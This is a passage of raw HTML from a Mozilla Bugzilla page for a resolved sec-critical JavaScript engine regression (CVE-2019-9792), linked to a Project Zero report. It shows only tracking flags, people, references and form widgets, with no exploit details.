:&quot;wontfix&quot;,&quot;cf_status_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_firefox95&quot;:&quot;---&quot;,&quot;cf_status_firefox66&quot;:&quot;fixed&quot;,&quot;status&quot;:&quot;RESOLVED&quot;,&quot;cf_a11y_review_project_flag&quot;:&quot;---&quot;,&quot;cf_root_cause&quot;:&quot;---&quot;}"></span>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">RESOLVED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            RESOLVED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-target_milestone"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            mozilla68

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_iteration" style="display:none"
>
    <div class="name">Iteration:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_iteration">
            ---

        </span>
    </div>

  
</div>


      <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">Webcompat Priority</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_webcompat_priority-dirty">
  <select id="cf_webcompat_priority" name="cf_webcompat_priority">
        <option value="---"
          id="v4274_cf_webcompat_priority" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Root Cause</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_root_cause-dirty">
  <select id="cf_root_cause" name="cf_root_cause">
        <option value="---"
          id="v4701_cf_root_cause" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">a11y-review</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_a11y_review_project_flag-dirty">
  <select id="cf_a11y_review_project_flag" name="cf_a11y_review_project_flag">
        <option value="---"
          id="v4876_cf_a11y_review_project_flag" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">user-doc-firefox</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_sumo-dirty">
  <select id="cf_tracking_firefox_sumo" name="cf_tracking_firefox_sumo">
        <option value="---"
          id="v4660_cf_tracking_firefox_sumo" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Fission Milestone</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_fission_milestone-dirty">
  <select id="cf_fission_milestone" name="cf_fission_milestone">
        <option value="---"
          id="v4222_cf_fission_milestone" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr60</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=equals&amp;v1=66%2B">66+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox65</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox65&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox66</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox67</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox67&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox68</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox68&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr78-dirty">
  <select id="cf_tracking_thunderbird_esr78" name="cf_tracking_thunderbird_esr78">
        <option value="---"
          id="v4823_cf_tracking_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr78-dirty">
  <select id="cf_status_thunderbird_esr78" name="cf_status_thunderbird_esr78">
        <option value="---"
          id="v4829_cf_status_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr91-dirty">
  <select id="cf_tracking_thunderbird_esr91" name="cf_tracking_thunderbird_esr91">
        <option value="---"
          id="v5236_cf_tracking_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr91-dirty">
  <select id="cf_status_thunderbird_esr91" name="cf_status_thunderbird_esr91">
        <option value="---"
          id="v5242_cf_status_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr60</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr60-dirty">
  <select id="cf_tracking_firefox_esr60" name="cf_tracking_firefox_esr60">
        <option value="66+"
          id="v4114_cf_tracking_firefox_esr60" selected
        >66+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr60-dirty">
  <select id="cf_status_firefox_esr60" name="cf_status_firefox_esr60">
        <option value="fixed"
          id="v3636_cf_status_firefox_esr60" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr78-dirty">
  <select id="cf_tracking_firefox_esr78" name="cf_tracking_firefox_esr78">
        <option value="---"
          id="v4808_cf_tracking_firefox_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="---"
          id="v4813_cf_status_firefox_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="---"
          id="v5194_cf_tracking_firefox_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="---"
          id="v5199_cf_status_firefox_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox65</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox65-dirty">
  <select id="cf_status_firefox65" name="cf_status_firefox65">
        <option value="wontfix"
          id="v4037_cf_status_firefox65" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox66</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox66-dirty">
  <select id="cf_tracking_firefox66" name="cf_tracking_firefox66">
        <option value="+"
          id="v4100_cf_tracking_firefox66" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox66-dirty">
  <select id="cf_status_firefox66" name="cf_status_firefox66">
        <option value="fixed"
          id="v4108_cf_status_firefox66" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox67</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox67-dirty">
  <select id="cf_tracking_firefox67" name="cf_tracking_firefox67">
        <option value="+"
          id="v4188_cf_tracking_firefox67" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox67-dirty">
  <select id="cf_status_firefox67" name="cf_status_firefox67">
        <option value="fixed"
          id="v4196_cf_status_firefox67" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox68</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox68-dirty">
  <select id="cf_tracking_firefox68" name="cf_tracking_firefox68">
        <option value="+"
          id="v4252_cf_tracking_firefox68" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox68-dirty">
  <select id="cf_status_firefox68" name="cf_status_firefox68">
        <option value="fixed"
          id="v4260_cf_status_firefox68" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox93-dirty">
  <select id="cf_tracking_firefox93" name="cf_tracking_firefox93">
        <option value="---"
          id="v5266_cf_tracking_firefox93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="---"
          id="v5271_cf_status_firefox93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="---"
          id="v5284_cf_tracking_firefox94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="---"
          id="v5289_cf_status_firefox94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="---"
          id="v5311_cf_tracking_firefox95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="---"
          id="v5316_cf_status_firefox95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: saelo, Assigned: nbp)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_422187" ><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=422187" > <span class="fna">nbp</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_634439" ><img src="https://secure.gravatar.com/avatar/dd173269d2ae1dd60942eeb75caaef98?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=634439" > <span class="fna">saelo</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field" id="field-triage_owner"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_607698" ><img src="https://secure.gravatar.com/avatar/629d9cacc1e7a36371e4583cc5739cf4?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=607698" > <span class="fna">sdetar</span></a>
</div>

        </span>
    </div>

  
</div>

    

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="13">13 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
          <h3 class="module-subtitle" id="module-references-subtitle">
            (Regression, <div class="link">
    <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1794" target="_blank"
      rel="noreferrer" title="https://bugs.chromium.org/p/project-zero/issues/detail?id=1794"
      class="bug-url" data-safe="1">URL</a>
  </div>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list edit-show" id="field-dependson" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-blocked" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
        ---
        </span>
    </div>

  
</div>

    <div class="field bug-list edit-show" id="field-regresses" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
        ---
        </span>
    </div>

  
</div><div class="field bug-list" id="field-regressed_by"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - FlagAllOperandsAsHavingRemovedUses can take a very long time"
   href="/show_bug.cgi?id=1489142">1489142</a>
      </div>

        </span>
    </div>

  
</div>

    
</div><div class="fields-rhs">

    <div class="field" id="field-bug_file_loc"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1794" target="_blank"
      rel="noreferrer" title="https://bugs.chromium.org/p/project-zero/issues/detail?id=1794"
      class="bug-url" data-safe="1">bugs.chromium.org/p/project-zero/issu...</a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-see_also" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
        ---
        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: csectype-other, regression, sec-critical, Whiteboard: [adv-main66+][adv-esr60.6+])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
            CVE-2019-9792

        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=csectype-other&amp;resolution=---">csectype-other</a>, 
          <a href="/buglist.cgi?keywords=regression&amp;resolution=---">regression</a>, 
          <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a>
        </span>
    </div>

  
</div>

    <div class="field" id="field-status_whiteboard"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">[adv-main66+][adv-esr60.6+]
        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_qa_whiteboard" style="display:none"
>
    <div class="name">QA Whiteboard:
    </div>


  
    <div class="value">
        <span id="field-value-cf_qa_whiteboard">
        ---
        </span>
    </div>

  
</div>

    

    <div class="field edit-show" id="field-cf_has_regression_range" style="display:none"
>
    <div class="name">Has Regression Range:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_regression_range">
            ---

        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_has_str" style="display:none"
>
    <div class="name">Has STR:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_str">
            ---

        </span>
    </div>

  
</div>

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-bug_flags"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_488993" ><a class="email " href="/user_profile?user_id=488993" > <span class="fna">avaida</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#a2054816_488993"
            class="rel-time-title activity-ref"
            title="3 years ago"
        data-time="1553842517"
      >qe-verify</a>
    </td>

    <td class="flag-value">-
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_488993" ><a class="email " href="/user_profile?user_id=488993" > <span class="fna">avaida</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually" for="flag-1863271">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-1863271-dirty">
      <select id="flag-1863271" name="flag-1863271"
        title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
            <option value="-" selected>-</option>
      </select>
    </td>


  </tr>
          </tbody>
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?"
        class="bug-flag">
          <option value="X"></option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag tracking inclusion in the desktop Firefox product backlog." for="flag_type-846">firefox-backlog</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-846-dirty">
      <select id="flag_type-846" name="flag_type-846"
        title="Flag tracking inclusion in the desktop Firefox product backlog."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag_type-803">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-803-dirty">
      <select id="flag_type-803" name="flag_type-803"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
